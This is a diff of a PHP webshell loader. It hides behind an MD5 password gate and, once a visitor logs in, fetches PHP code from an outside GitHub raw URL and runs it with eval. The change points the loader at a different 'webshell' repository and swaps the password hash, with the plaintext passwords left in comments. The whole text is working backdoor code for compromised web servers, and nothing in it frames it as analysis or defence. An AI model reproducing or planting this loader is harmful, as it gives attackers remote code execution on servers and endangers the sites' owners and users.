@@ -33,13 +33,13 @@ if (is_logged_in()) {
         return $url_get_contents_data;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/HaxorSecInfec/gecko-nebula/main/nebulanopass.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/exploit-haxor/webshell/main/find.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
     if (isset($_POST['password'])) {
         $entered_password = $_POST['password'];
-        $hashed_password = '4980752f5a23d295723a95d82d60e456'; // bupexz
+        $hashed_password = '53aefec08170b2ebed981a0a86d0dbe0'; // scan
         if (md5($entered_password) === $hashed_password) {
             // Password is correct, set a cookie to indicate login
             setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
